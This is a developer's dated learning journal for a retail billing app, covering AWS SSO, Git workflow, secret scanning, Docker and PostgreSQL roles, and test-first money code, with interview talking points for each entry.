- **What happened:** I asked whether Claude would work in AWS through the browser. Plan: I create the account and an admin login in IAM Identity Center in the browser, once. After that, `aws sso login` opens the browser for approval and gives my laptop temporary credentials. Claude runs `aws` and `terraform` commands in my terminal with those credentials, always `terraform plan` first and `apply` only after I approve.
- **Why / what I learned:** Clicking in the console isn't repeatable or reviewable; infrastructure as code is. SSO credentials expire after a few hours, so there are no long-lived access keys to leak, and access stops when the session ends. The root user is only for account-level tasks, protected by MFA.
- **Say it in an interview:** "Nobody, including my AI assistant, has permanent AWS keys. Everything goes through short-lived SSO sessions and Terraform plans I review."
- **Follow-ups to expect:** What's the difference between an IAM user, a role and Identity Center? Why never use the root account?

### 2026-10-29 — One domain for app and API, so cookies work `#security` `#frontend` `#gotcha` → ADR 0011
- **What happened:** The first plan served the web app from CloudFront and the API from a different host. With session cookies (ADR 0009) that breaks: the browser treats the API as another site and won't send `SameSite` cookies on its requests. Fixed by having Caddy serve the web app *and* forward `/api` on one domain. Locally, Vite's dev server proxies `/api` the same way.
- **Why / what I learned:** Same-origin hosting avoids both CORS setup and cross-site cookie problems.
- **Say it in an interview:** "Cookie-based auth shaped my hosting: app and API share one origin, so there's no CORS and no third-party cookie issue."
- **Follow-ups to expect:** What's the difference between same-site and same-origin? What does `SameSite=Lax` allow?

### 2026-10-29 — GitHub Actions with OIDC `#devops` → ADR 0012
- **What happened:** CI on every push/PR. After a merge, the deploy runs through AWS Systems Manager on the EC2 server (no SSH port open), with a health check and rollback to the previous image. AWS access uses OIDC, so no keys are stored in GitHub.
- **Why / what I learned:** Long-lived cloud keys in CI are a top cause of leaks. Jenkins would need its own server to run and patch. GitHub plan gotcha: on private repos, deployment approvals (required reviewers) need GitHub Enterprise; on public repos they're free.
- **Say it in an interview:** "My pipeline has no stored AWS secrets; each run gets short-lived credentials for one role."
- **Follow-ups to expect:** How do you roll back a bad deploy?

### 2026-10-29 — Testing against a real PostgreSQL `#testing` → ADR 0013
- **What happened:** Vitest for business rules, Testcontainers for integration tests on real PostgreSQL, and Playwright for end-to-end flows.
- **Why / what I learned:** Locks, concurrency and RLS can't be tested with mocks or SQLite. NestJS defaults to Jest; using Vitest needs the SWC plugin so decorators keep their metadata.
- **Say it in an interview:** "I wrote a test where two simulated counters sell the last unit at once — that bug only shows against the real database."
- **Follow-ups to expect:** Test pyramid? How long does your CI take?

### 2026-10-29 — Hindi PDFs need text shaping; one-key printing `#frontend` `#gotcha` → ADR 0014
- **What happened:** Chose browser printing with print stylesheets (80 mm, 58 mm, A4), Chrome's `--kiosk-printing` flag for no print dialog, and headless Chromium for PDFs.
- **Why / what I learned:** Devanagari letters combine (क + ष = क्ष). Many JavaScript PDF libraries don't do this "text shaping" and print broken Hindi. A browser engine does it right.
- **Say it in an interview:** "Supporting Hindi was more than translations: I had to pick a PDF pipeline that shapes Devanagari correctly."
- **Follow-ups to expect:** How do barcode scanners work with a web app? (They act as a keyboard.)

### 2026-10-29 — AI uses tool calling, not text-to-SQL `#ai` → ADR 0015
- **What happened:** The assistant may only call a fixed set of my own functions, which run with the asking user's permissions. It never writes SQL.
- **Why / what I learned:** Model-written SQL can bypass staff permissions (salaries, profit) and produce silently wrong joins. Functions are testable, and every number comes from them.
- **Say it in an interview:** "The model decides *which* question to ask; my code decides *what it's allowed to see* and computes the numbers."
- **Follow-ups to expect:** How do you evaluate the AI's accuracy? (An eval set of questions with known answers from demo data.)

### 2026-10-29 — A Claude subscription is not an API key `#ai` `#cost` `#gotcha`
- **What happened:** I planned to use my Claude subscription for the app's AI. Learned that Pro/Max subscriptions cover claude.ai and Claude Code only. An app needs an API key from the Claude Console, billed separately (prepaid credits, with a spend limit).
- **Why / what I learned:** Consumer subscriptions and developer APIs are different products. Rough cost: a question of ~10k input + 1k output tokens costs about $0.0015 on Haiku 5.5, $0.03 on Sonnet 5.5, or $0.06 on Opus 5.5 (prices cached 2026-10-06). A few dollars of credit covers a demo.
- **Say it in an interview:** "I estimated cost per question before building and put a hard monthly cap in the app."
- **Follow-ups to expect:** How would you cut AI cost? (Prompt caching, smaller model for simple questions.)

### 2026-10-29 — Demo data generated through the app's own code `#testing` → ADR 0016
- **What happened:** A seed script with a fixed random seed builds a realistic demo shop by calling the same services the app uses. A first version comes at the end of Phase 1.
- **Why / what I learned:** Inserting rows directly can create impossible states (stock not matching movements). Going through services makes the demo obey every rule and doubles as a big test.
- **Say it in an interview:** "My demo data is reproducible and rule-abiding because it's created by the real business logic."
- **Follow-ups to expect:** How do you reset the demo?

### 2026-10-29 — GST treats branches in different states as separate businesses `#gst` `#gotcha`
- **What happened:** Noticed that moving stock between branches with different GSTINs is a taxable supply under GST (distinct persons), which needs a tax invoice with IGST, not just a stock movement. Added it as an open question to Module 01.
- **Why / what I learned:** Domain rules can turn a "simple" feature into an accounting event. Check the law before modelling it.
- **Say it in an interview:** "Branch transfers looked like an inventory feature, but across states they're a GST invoice. I caught it in design, not in production."
- **Follow-ups to expect:** —

### 2026-10-29 — Found contradictions in the requirements before building `#requirements`
- **What happened:** In the kickoff, flagged that (1) medical costing (oldest-first) and billing order (expiry-first) can pick different batches, (2) "one shared counter computer" vs "several counters", and (3) Module 06 asks whether the owner's actions are logged although Module 00 already says every action is. Each is now an open question in its module file.
- **Why / what I learned:** Reading requirements critically before coding is cheaper than fixing code later.
- **Say it in an interview:** "I review requirements for contradictions first; it's the cheapest bug to fix."
- **Follow-ups to expect:** —

### 2026-10-30 — "failed to connect to the docker API" `#devops` `#gotcha`
- **What happened:** The first `docker` command of the session failed with `failed to connect to the docker API at npipe:////./pipe/dockerDesktopLinuxEngine`. Docker Desktop wasn't running. Started it and waited until `docker info` answered (about a minute).
- **Why / what I learned:** Docker is client–server. The `docker` command is only a client that sends requests to the Docker engine (the daemon). On Windows the engine runs inside a WSL 2 Linux VM that Docker Desktop starts. No engine, nobody to answer.
- **Say it in an interview:** "The Docker CLI is just an API client; the daemon does the work. The same CLI can drive a remote engine through `DOCKER_HOST`."
- **Follow-ups to expect:** Why do Linux containers need a Linux kernel on Windows? Container vs virtual machine?

### 2026-10-30 — Scanned the whole git history for secrets before going public `#security` `#git` `#devops` → ADR 0017
- **What happened:** Ran gitleaks over every commit (`--log-opts="--all"`) inside Docker, so nothing had to be installed. It scanned 5 commits, not 3, because the 10-29 history rewrite left the old commits under `refs/original/` (`git filter-branch` keeps a backup there). No leaks. Also searched all history for emails and phone numbers: none.
- **Why / what I learned:** Git keeps everything ever committed. A secret removed in a later commit is still in history, and making a repo public publishes all of it. If a secret leaks, revoke it first: deleting the commit doesn't remove clones, forks or GitHub's copies.
- **Say it in an interview:** "Before going public I scanned the full history, not just the current files. Now GitHub push protection blocks known token formats at `git push`, and gitleaks runs in CI."
- **Follow-ups to expect:** How do you remove a secret from history? (Rotate it first; then `git filter-repo`, force-push, and ask GitHub to purge cached views.) Push protection vs gitleaks? (Push protection matches known provider token formats with few false alarms; gitleaks adds broader patterns and runs anywhere, including CI.)

### 2026-10-30 — My commit email becomes public `#github` `#security` `#gotcha`
- **What happened:** Every commit stores the author's name and email, and on a public repo anyone can read them (add `.patch` to a commit's URL). Mine used my personal Gmail. Switched this repo to GitHub's noreply address (`144018864+aryangupta1811@users.noreply.github.com`) and turned on *Block command line pushes that expose my email*. The 3 commits already on GitHub keep the Gmail, because GitHub keeps old commits reachable by ID even after a rewrite.
- **Why / what I learned:** Bots scrape public commits for email addresses. Privacy choices are cheapest before publishing. GitHub links a commit to a profile by matching its email to one on the account, and the noreply address counts.
- **Say it in an interview:** "Commit metadata is public data, so I commit with GitHub's noreply address."
- **Follow-ups to expect:** Author vs committer? How would you sign commits? (GPG or SSH signing, shown as "Verified".)

### 2026-10-30 — Secret scanners don't find personal data `#security` `#git`
- **What happened:** Once the repo was public, I asked for a check that nothing private gets committed. gitleaks scanned the staged changes and all 6 commits: no secrets. But gitleaks only knows secret formats (API keys, tokens, private keys), so a separate `git grep` searched for emails, phone numbers, Aadhaar/PAN/GSTIN numbers and home-folder paths. The first run of the search found nothing, although an old `C:\…` home-folder path in this log should have matched: the pattern's backslashes had been mangled on the way to `git grep`. Run exactly as documented, it caught that path, which I then removed. Both checks are now steps in `/end-session` and a rule in `CLAUDE.md`.
- **Why / what I learned:** Secrets (credentials) and personal data (PII) are different problems that need different tools. Automated checks at several points (before commit, at push, in CI) catch more than relying on memory. And a check that has never caught anything proves nothing: test it on a known bad example first, like a test that must fail before it passes.
- **Say it in an interview:** "I check for secrets and personal data separately, before every commit; push protection and CI are the safety nets behind that."
- **Follow-ups to expect:** What's PII? How would you handle real customer data in a demo? (Never; demo data is generated with made-up values.)

### 2026-10-30 — `gh auth login`: the code is in the terminal, not on my phone `#github` `#security` `#gotcha`
- **What happened:** GitHub's "Authorize your device" page asked for an 8-character code, and I waited for it on my phone. It never comes there: `gh` prints it in the terminal ("First copy your one-time code: XXXX-XXXX"), and the browser had opened on top of it. Fix: `gh auth login --hostname github.com --git-protocol https --web --clipboard` copies the code to the clipboard.
- **Why / what I learned:** This is the OAuth device flow (RFC 8628), used by CLIs and smart TVs that can't show a login page. The device asks GitHub for a short code; I type it in a browser where I'm already logged in; GitHub links the two and gives the device a token. The page warns "never use a code sent by someone else" because entering an attacker's code would log *their* device into my account (device-code phishing).
- **Say it in an interview:** "CLI tools log in with the OAuth device flow: the code is generated on the device and approved in a browser session I already trust."
- **Follow-ups to expect:** Device flow vs the normal browser redirect flow? (Redirect needs the app to receive a callback; a CLI or TV can't, so it polls GitHub until I approve.)

### 2026-10-30 — `gh pr create --fill` named my first PR after the branch `#github` `#gotcha`
- **What happened:** Opened PR #1 with `gh pr create --fill`. With more than one commit on the branch, `--fill` used the branch name ("chore/p0.1 git workflow") as the title and a list of commits as the description, skipping the PR template. With squash merges that title would have become the commit message on `main`, breaking the Conventional Commits rule on the very first merge. Fixed the title and description on GitHub before merging, and switched the docs to `gh pr create --web`, which opens GitHub's form with the template loaded.
- **Why / what I learned:** Read what a tool's convenience flag actually does before putting it in a workflow. Looking at the PR before merging is exactly what the PR step is for.
- **Say it in an interview:** "With squash merges, the PR title *is* the commit message on main, so I treat the title as part of the change."
- **Follow-ups to expect:** How would you enforce PR titles automatically? (A CI check on the title; planned for P0.6.)

### 2026-10-30 — `.gitattributes` beats `core.autocrlf` `#git` `#gotcha`
- **What happened:** Found the cause of the "LF will be replaced by CRLF" warning: Git for Windows sets `core.autocrlf=true` in its system config. Added `.gitattributes` with `* text=auto eol=lf`. `git ls-files --eol` showed all 46 files were already LF, so `git add --renormalize .` changed nothing.
- **Why / what I learned:** `core.autocrlf` is a per-machine setting, so every clone could behave differently. `.gitattributes` is committed, so the rule travels with the repo and wins over local settings. `text=auto` lets Git skip binary files.
- **Say it in an interview:** "Line-ending policy lives in the repo, not in each developer's config."
- **Follow-ups to expect:** What breaks with CRLF on Linux? (`/bin/sh^M: bad interpreter` in shell scripts.)

### 2026-10-30 — Git workflow: GitHub flow, squash merges, Conventional Commits, protected `main` `#git` `#github` `#devops` → ADR 0017
- **What happened:** Decided: one task = one branch = one PR; squash merge only; Conventional Commits for commits and PR titles; a ruleset on `main` that requires a PR, blocks force-push and deletion, requires linear history and lets nobody bypass. Made the repo public instead of waiting for the Student Pack: protection and secret scanning are free on public repos, and recruiters need to see it anyway. Added a PR template with the project's checklist. Afterwards, checked the result through GitHub's API rather than trusting the web page: the ruleset is active and reports `current_user_can_bypass: never`, and secret scanning turned out to be still off, so it was switched on with `gh api -X PATCH`.
- **Why / what I learned:** GitHub flow fits deploy-on-merge; Git Flow's release branches are for versioned software. Two gotchas: GitHub won't let you approve your own PR, so a solo repo needs 0 required approvals (the PR is a CI gate and a self-review); and after a squash merge `git branch -d` says "not fully merged", because the branch's commits got new IDs on `main`, so delete with `-D` once the PR is merged.
- **Say it in an interview:** "`main` is protected even from me. Everything lands through a PR, squash-merged as one Conventional Commit, so the history reads like a changelog."
- **Follow-ups to expect:** Trunk-based development vs GitHub flow? (Trunk-based merges tiny changes into `main` many times a day, often behind feature flags; GitHub flow is the same idea with a PR per change.) How do you ship a hotfix? (Same flow: a `fix/` branch and a fast PR.)

### 2026-10-30 — The monorepo scaffold: one workspace, shared code first `#architecture` `#process`
- **What happened:** Set up a pnpm workspace (`apps/*`, `packages/*`) with one root config each for TypeScript, ESLint and Prettier, and `pnpm check` to run every check. Created only `packages/shared`. The web app and API folders come in P0.4/P0.5, generated by the Vite and NestJS tools, because empty placeholder apps would have been thrown away. `shared` is used straight from its TypeScript source (no build step); P0.4 checks that NestJS can load it. Tool versions live once in a pnpm *catalog*, so every package uses the same TypeScript and Vitest.
- **Why / what I learned:** Strict TypeScript flags are cheapest on day one. `noUncheckedIndexedAccess` already mattered in the first function: regex match groups come back as `string | undefined`, so the code must handle the missing case instead of assuming it. `shared` has `"types": []` and no DOM library, so Node-only or browser-only code there fails the type check: it has to run in both.
- **Say it in an interview:** "I set up the monorepo with one config per tool at the root and strict TypeScript from the first file, and I only created packages when they had real code."
- **Follow-ups to expect:** Why not Turborepo or Nx? (Plain pnpm is enough until builds get slow; ADR 0002.) What does `noUncheckedIndexedAccess` do? (Array and object lookups may be `undefined`, so you must check.)

### 2026-10-30 — "Latest" TypeScript broke the linter: read the peer warning `#gotcha` `#process`
- **What happened:** `pnpm add typescript` installed 7.0.2, the new compiler rewritten in Go. pnpm warned about an unmet peer dependency: typescript-eslint 8.72 supports TypeScript `>=4.8.4 <6.1.0`, because type-aware lint rules call the compiler's internal API, which 7.0 changed. Pinned TypeScript to `~6.0.3` in the catalog, with a comment saying why. `pnpm peers check` then reported nothing.
- **Why / what I learned:** A peer dependency is a package a plugin needs you to install in a version it supports. The warning is easy to scroll past, but here it meant the linter could have broken in confusing ways. `~6.0.3` allows 6.0.x patches only; `^` would have allowed 6.1, outside the supported range.
- **Say it in an interview:** "I don't install 'latest' blindly. When a peer range said my lint tooling didn't support the new major version, I pinned the newest supported one and left a note to upgrade later."
- **Follow-ups to expect:** `^` vs `~`? (`^1.2.3` allows any 1.x; `~1.2.3` allows 1.2.x.) Why is TypeScript 7 a big deal? (The Go port type-checks about 10x faster.)

### 2026-10-30 — Supply-chain guards from the first install `#security` `#devops`
- **What happened:** Set pnpm's `minimumReleaseAge` to 1440 minutes, so it only installs versions that have been public for at least a day. pnpm also blocks dependencies' install scripts unless approved, and none of ours needed one. The committed lockfile records the exact version and checksum of every package.
- **Why / what I learned:** Attackers who steal a maintainer's npm token publish a poisoned version of a popular package. Such versions are usually spotted and pulled within hours, so a one-day wait avoids most of them. Install scripts are the usual way the poison runs on a developer's machine.
- **Say it in an interview:** "Dependencies are code I didn't write, so I pin them with a lockfile, block install scripts by default, wait a day before taking new releases, and get Dependabot alerts."
- **Follow-ups to expect:** What's in a lockfile? (Exact resolved versions plus integrity hashes, so every install is identical.) What if you need a security fix within that day? (Install it explicitly; the wait is a default, not a lock.)

### 2026-10-30 — Proving the checks can fail `#testing` `#process`
- **What happened:** With the tools set up, every check passed, but a check that has never failed proves nothing. Planted one problem at a time: a type error (TS2322), `Buffer` in shared code (TS2591, because Node types are excluded), an `any` (`no-explicit-any`), an unawaited promise (`no-floating-promises`, which shows type-aware linting is really on), and bad formatting. Each command exited 1. Also found that Vitest 5 exits 1 when there are no test files, so `--passWithNoTests` was used until the first tests landed.
- **Why / what I learned:** It's the same lesson as the personal-data search that silently matched nothing in session 2. Test the tester: a misconfigured linter that lints zero files also reports "no problems".
- **Say it in an interview:** "Before trusting my CI checks, I planted a deliberate error for each one and watched it fail."
- **Follow-ups to expect:** What's type-aware linting? (Rules that use the compiler's type information, e.g. a promise that's never awaited.)

### 2026-10-30 — First money code, test-first, and the `0.29 * 100` trap `#money` `#testing` → ADR 0008
- **What happened:** Wrote `parseRupees("125.50") → 12550` and `formatPaise(12345678) → "₹1,23,456.78"` with TDD: the tests first, watched all 30 (then 12 more) fail with "is not a function", then the code. 42 tests pass. The tests include the floating-point traps: in JavaScript `0.29 * 100` is `28.999999999999996` and `1.1 * 100` is `110.00000000000001`. So `parseRupees` splits the text at the dot and multiplies only whole numbers. It refuses `1,250`, `₹125`, `12.555`, `-5`, `1e3` and Devanagari digits, returning `null` rather than guessing.
- **Why / what I learned:** Bad input from a person is expected, so it returns `null` and the screen asks again. A non-integer amount inside the code is a bug, so `formatPaise` throws a `RangeError`. Watching the test fail first proves it tests the thing you think it does.
- **Say it in an interview:** "Typed amounts never go through floating-point maths: I parse the text into integer paise and refuse anything ambiguous, because a guessed amount could silently save a wrong bill."
- **Follow-ups to expect:** Why `null` and not an exception? Why refuse commas? (A wrong guess is worse than asking again; Excel import will get its own rules.)

### 2026-10-30 — Lakh/crore grouping with `Intl`, without a float `#money` `#gotcha`
- **What happened:** `Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' })` gives Indian grouping (`₹98,76,54,321.00`) and `-₹1,250.00` for negatives. Instead of `paise / 100`, `formatPaise` builds the decimal text `"123456.78"` from the digits and passes the string, which `format()` accepts exactly. TypeScript rejected that (TS2769): its types only accept strings it can prove are numbers (`` `${number}` ``), so the built-up string needs an `as` cast, with a comment. `-0` shows as `₹0.00`, not `-₹0.00`.
- **Why / what I learned:** The built-in `Intl` API knows each locale's rules, so no library is needed. The formatter is created once at module level, because building it on every call is slow.
- **Say it in an interview:** "Display goes through one helper that uses the en-IN locale for lakh/crore grouping, fed an exact decimal string so even display never touches a float."
- **Follow-ups to expect:** What about Hindi? (`hi-IN` uses the same Latin digits and grouping by default.)

### 2026-10-30 — Two scanner gotchas: a fake Aadhaar and a mangled path `#security` `#gotcha`
- **What happened:** The personal-data search flagged a test amount: twelve digits in a row look like an Aadhaar number. I changed the test value instead of learning to ignore the hit, because a false alarm on every commit trains you to skip real ones. Separately, gitleaks run from Git Bash failed with `stat C:/Program Files/Git/repo`: Git Bash rewrites arguments that look like Unix paths (`/repo`) into Windows paths. Running it from PowerShell, as `git-workflow.md` says, works.
- **Why / what I learned:** Keep alerts trustworthy by fixing false positives at the source. Git Bash (MSYS) path conversion can be turned off with `MSYS_NO_PATHCONV=1`.
- **Say it in an interview:** "If a check keeps raising false alarms, I fix the cause, because alert fatigue is how real problems get ignored."
- **Follow-ups to expect:** How would you handle false positives in CI? (A reviewed allowlist entry with a reason, never turning the check off.)

### 2026-10-30 — The final review caught a wrong assumption in my plan `#architecture` `#gotcha` `#process`
- **What happened:** A fresh reviewer checked the whole P0.2 branch. It tried about 60 hostile inputs on `parseRupees` and found no wrong amount. It did find that my plan claimed `shared`'s source "runs under Node without changes". It doesn't: `node` importing `src/index.ts` fails with `ERR_MODULE_NOT_FOUND … money.js`. Node 24 can strip TypeScript types itself, but it won't map an import of `./money.js` to `money.ts`. Vite and Vitest do that mapping, so the tests passed. I fixed the plan and wrote the finding into the P0.4 task: the API will need `shared` compiled (or bundled).
- **Why / what I learned:** "It works in the tests" only proves it works in the test runner. An assumption is a claim until something runs it. A reviewer with a fresh context catches what the author's context hides.
- **Say it in an interview:** "My shared package worked in Vite and Vitest, but a review showed Node can't load it from source, so I planned a compile step for the API before writing it, not after a failed deploy."
- **Follow-ups to expect:** How do monorepos share TypeScript between a bundled frontend and a Node backend? (Compile the shared package, use project references, or bundle the backend.)

### 2026-10-30 — A test that passes at once must still be shown to fail `#testing`
- **What happened:** Fixed the review's minor points. Two new tests (`-5` paise → `-₹0.05`, and `"\t125\n"` pasted from a spreadsheet → 12500) passed immediately, because the code already handled them. To prove they guard anything, I broke the code on purpose: dropped `Math.abs` so the minus sign landed inside the zero-padding, and made `trim` strip only spaces. Exactly those two tests failed, and the other 42 didn't notice. Then I restored the code. Also: the error for `2 ** 53` said "not a whole number", but it is whole, just past the safe range, so the message now says "safe whole number" (the test first, red, then the fix). And Prettier and ESLint no longer scan the scratch folder, and type-aware rules no longer trip on `.mjs` config files. Both were shown broken with a probe file first.
- **Why / what I learned:** This is mutation testing by hand: change the code the way a future bug would and check a test notices. A test that can't fail is decoration.
- **Say it in an interview:** "When a new test passes straight away, I break the code on purpose to make sure the test would catch that bug."
- **Follow-ups to expect:** What's mutation testing? (Tools like Stryker make many small code changes automatically and report which ones no test catches.)

### 2026-10-30 — ADR 0018: ESLint + Prettier, pnpm catalogs, supply-chain guards `#process` `#security` → ADR 0018
- **What happened:** Recorded the tooling chosen in P0.2 as an ADR. ESLint with typescript-eslint's type-aware rules plus Prettier won over Biome (much narrower type-aware checks) and over no linter (the compiler alone misses unawaited promises). A pnpm catalog keeps one version of each tool for every package. The lockfile is committed, install scripts are blocked by default, and new versions wait a day. TypeScript stays on `~6.0` until typescript-eslint supports 7.
- **Why / what I learned:** Even "just tooling" is a decision with trade-offs (speed vs depth of checks, newest vs supported). Writing it down stops it being re-argued, and records when to revisit it.
- **Say it in an interview:** "I chose type-aware linting because rules like no-floating-promises catch an unawaited database write, the kind of bug that loses a bill. For the supply chain: a lockfile, blocked install scripts, and a one-day wait on new releases."
- **Follow-ups to expect:** Why not Biome? When would you switch? (When its type-aware rules cover what we rely on, or lint time becomes a problem.)

### 2026-10-30 — DevOps stage 2: images, containers, volumes and Compose `#devops` `#database`
- **What happened:** Started PostgreSQL 18 with one command, `pnpm db:up` (`docker compose up -d --wait`). Docker pulled the `postgres:18` image (~55 s the first time), created a named volume `business-software_pgdata` and a container, and waited until its healthcheck passed. To prove the data lives in the volume and not the container, I created a marker table, ran `docker compose down` (which deletes the container), started again, and the row was still there. The owner said any DevOps tool is fine, with no course restrictions.
- **Why / what I learned:** The image is the recipe; the container is a disposable running copy; the volume is the part that must never be thrown away. `docker compose down` keeps volumes; `down -v` deletes them, which for a database means deleting the data. `--wait` makes the command return only when the service is healthy, so the next command can use it straight away.
- **Say it in an interview:** "My database runs in Docker Compose with its data in a named volume, so I can delete and recreate the container freely. The same image version runs in my tests and matches RDS."
- **Follow-ups to expect:** What's the difference between a bind mount and a named volume? (A bind mount maps a host folder, which I use read-only for the bootstrap SQL; a named volume is managed by Docker and is right for database files.)

### 2026-10-30 — PostgreSQL 18 moved its data folder in the Docker image `#devops` `#database` `#gotcha`
- **What happened:** Before writing `compose.yaml`, I checked the image docs. From PostgreSQL 18, the official image keeps its data in `/var/lib/postgresql/18/docker` and declares the volume at `/var/lib/postgresql`. Most tutorials still mount `/var/lib/postgresql/data`. I mounted the parent folder and checked `show data_directory` → `/var/lib/postgresql/18/docker`. My first write-up claimed the old mount would silently lose data. The final review corrected me: the current image's entrypoint detects a mount at the old path and **refuses to start**, with an explanation (I checked the script). With older images, or a custom `PGDATA`, the mismatch *can* silently put data in an anonymous volume.
- **Why / what I learned:** Copy-pasted config goes stale when a major version changes. Read the image's release notes, then verify on the running system. And verify your own explanation too: a confident wrong fact in an interview is worse than "I'd check".
- **Say it in an interview:** "With Postgres 18 the image's data path changed. I mounted the new path and verified the data directory and a restart. The image even refuses to start if you mount the old path, which is a nice fail-loud design."
- **Follow-ups to expect:** How would you upgrade Postgres 17 data to 18 in Docker? (`pg_dump`/restore or `pg_upgrade` into a new volume, keeping the old volume until the new one is verified.)

### 2026-10-30 — Two database roles, a bootstrap file and default privileges `#database` `#security` → ADR 0019
- **What happened:** A bootstrap SQL file, run once by an administrator, creates `app_owner` (runs migrations, owns tables) and `app_runtime` (what the app logs in as), plus the database. The first Drizzle migration runs `ALTER DEFAULT PRIVILEGES … GRANT SELECT, INSERT, UPDATE ON TABLES TO app_runtime`, so every future table gets those rights and never `DELETE`. psql's `\getenv` reads the passwords from environment variables, so they're never in git. Chose the `pg` driver (pg-boss uses it too), Drizzle 0.45 stable over the 1.0 release candidate, and the Debian image over Alpine (glibc like RDS, not musl; identical sorting will still need an ICU collation, P1.7).
- **Why / what I learned:** Table owners and superusers bypass Row-Level Security, so the app must not log in as the owner. Creating roles needs admin rights, which the migration role shouldn't have, so it lives outside migrations. Default privileges make "never grant DELETE" the default instead of something to remember.
- **Say it in an interview:** "The app's database user physically can't delete rows or change the schema. Migrations use a separate owner role. Grants come from default privileges, so a new table is safe without anyone remembering a GRANT."
- **Follow-ups to expect:** What about a table that should be insert-only, like an audit log? (Revoke UPDATE on that one table in its migration; P1.2.)

### 2026-10-30 — A healthcheck that says "ready" too early `#devops` `#gotcha`
- **What happened:** On first start, the Postgres image runs its init scripts (my bootstrap) on a temporary server that listens only on a Unix socket, then restarts. A plain `pg_isready` checks the socket, so it can report ready before the roles and database exist, and a migration run straight after would fail. The healthcheck uses `pg_isready -h 127.0.0.1` (TCP), which only answers after init has finished. Right after the first `pnpm db:up`, logging in as `app_owner` over TCP worked.
- **Why / what I learned:** "Container started" ≠ "service ready", and "ready" depends on what you check. A healthcheck should test what the next step needs.
- **Say it in an interview:** "My healthcheck connects over TCP, not the socket, because during first-start initialization the image's temporary server is socket-only. Otherwise `up --wait` could return before my roles exist."
- **Follow-ups to expect:** Difference between `depends_on` and a healthcheck? (`depends_on` with `condition: service_healthy` waits for the healthcheck; plain `depends_on` only waits for the container to start.)

### 2026-10-30 — Compose guards: required variables and a localhost-only port `#security` `#devops`
- **What happened:** Passwords are written as `${APP_RUNTIME_PASSWORD:?set APP_RUNTIME_PASSWORD in .env}`. With the variable missing, Compose refuses to start and names it, instead of creating a role with an empty password. The port is published as `127.0.0.1:5432:5432`. Without the IP, Docker listens on every network interface, so anyone on the same Wi-Fi could try to log in. `docker compose port db 5432` → `127.0.0.1:5432`.
- **Why / what I learned:** Fail loudly on missing config. Publish ports only where they're needed. Docker's port publishing can bypass the firewall rules people expect.
- **Say it in an interview:** "My compose file refuses to start without its secrets, and the database port is bound to localhost only."
- **Follow-ups to expect:** Where do secrets go in production? (SSM Parameter Store, read at deploy time; never in the image or the repo.)

### 2026-10-30 — Proving the database refuses: `42501`, not just "an error" `#testing` `#database`
- **What happened:** The integration test starts a throwaway `postgres:18` with Testcontainers, runs the same bootstrap file and migrations, then creates a table *after* the migrations. Before the grants migration existed, the insert/update test failed with `permission denied for table probe`: red for the right reason. With the migration, all 8 passed. The refusals (delete, truncate, create table, drop table, read migration history) assert SQLSTATE `42501` (insufficient privilege). An unrelated error, such as a misspelt table (`42P01`), would make the test fail instead of passing by accident. Then I planted `DELETE` into the grant: exactly the "refuses delete" test failed. The test reads the image from `compose.yaml`, so tests and local can't drift apart.
- **Why / what I learned:** A "should fail" test must check *why* it failed. A test that accepts any error passes on typos.
- **Say it in an interview:** "My tests assert the exact PostgreSQL error code for permission denied, and I planted a DELETE grant to confirm the test catches it."
- **Follow-ups to expect:** Why create the probe table after migrating? (To prove default privileges cover tables that don't exist yet, which is how real future tables will arrive.)

### 2026-10-30 — Small Windows and pnpm gotchas `#gotcha` `#security`
- **What happened:** (1) Windows PowerShell 5.1's `Set-Content -Encoding utf8` writes a byte-order mark (BOM). I rewrote `.env` without one, since some `.env` parsers read the BOM as part of the first variable's name. (2) pnpm 12 now *fails* `pnpm add` when dependencies' install scripts are blocked (`ERR_PNPM_IGNORED_BUILDS`). I denied the four explicitly (`allowBuilds: false` for esbuild, ssh2, cpu-features, protobufjs) with reasons in `pnpm-workspace.yaml`, because none is needed here. (3) The personal-data scan matched drizzle's all-zero placeholder UUID in a generated snapshot file: a false positive in a generated file. (4) A bash heredoc with apostrophes in it broke in the Windows shell tool; editing the file directly worked.
- **Why / what I learned:** Defaults differ between tool versions (PowerShell 5 vs 7, pnpm 10 vs 12). Blocking install scripts is only useful if every exception has a recorded reason.
- **Say it in an interview:** "pnpm blocks dependency install scripts by default. When it flagged four, I checked what each one does and denied all of them on the record."
- **Follow-ups to expect:** Why are install scripts dangerous? (They run arbitrary code on your machine at install time, which is how many npm supply-chain attacks work.)

### 2026-10-30 — The review found a test gap, and my first "red" was fake `#testing` `#gotcha` `#process`
- **What happened:** The final reviewer (a fresh context) checked all five risks from the plan on the live database and found no bugs. It did find gaps:
  - Deleting the sequence-grant line from migration `0000` would pass every test, because PostgreSQL doesn't check sequence rights for identity columns (it does for `serial`).
  - A forbidden extra grant like `TRIGGER` would also go unnoticed.
  - Two "facts" in my notes were wrong: the PG 18 mount claim, and "Debian sorts like RDS".

  I added a test that reads `pg_default_acl` and expects exactly `INSERT,SELECT,UPDATE` on tables and `SELECT,USAGE` on sequences. My first run of the two planted mutations "failed" as hoped, but the test also failed after I restored the file. The query itself was broken (`ORDER BY kind COLLATE "C"`: an output alias can't be used inside an expression), so it failed every time and proved nothing. After fixing the query: green on the real migration, and an `AssertionError` from exactly that test for each mutation. The other 8 tests didn't notice either mutation.
- **Why / what I learned:** A red test only counts if it's red *for the right reason*. Check the failure message, not just ✗. And behaviour tests can miss configuration that only matters for cases the test doesn't use (identity vs serial), so pin the configuration itself as well.
- **Say it in an interview:** "A reviewer showed a grant could vanish without any test failing, because identity columns don't check sequence privileges. I added a test that pins the exact grants and confirmed it with planted mutations. The first time, it failed for the wrong reason: a SQL error. I only trust a red test after reading why it's red."
- **Follow-ups to expect:** Identity vs serial? (Both use a sequence. `serial` is a default calling `nextval`, which checks the caller's sequence rights. Identity is built into the table, so inserting only needs the table's INSERT right.)

### 2026-10-30 — Secrets in a public repo: five leak paths, not one `#security` `#devops`
- **What happened:** The owner asked that the future Claude API key can never be read by GitHub users. `.gitignore` and gitleaks only cover git. I listed every way a secret leaks from a public project and gave each a rule in `docs/devops/secrets.md`:
  - git;
  - Docker image layers (anyone who pulls can run `docker history`);
  - the browser bundle (Vite inlines `VITE_*` variables);
  - CI (fork PRs, `pull_request_target`);
  - logs and error messages.

  In P0.4 I checked the image: no `.env`, and no secret in its environment or history.
- **Why / what I learned:** "Not in git" isn't "not public". Images, front-end bundles and logs are published too. A paid API key also gets a spend limit, so even a leak has a ceiling.
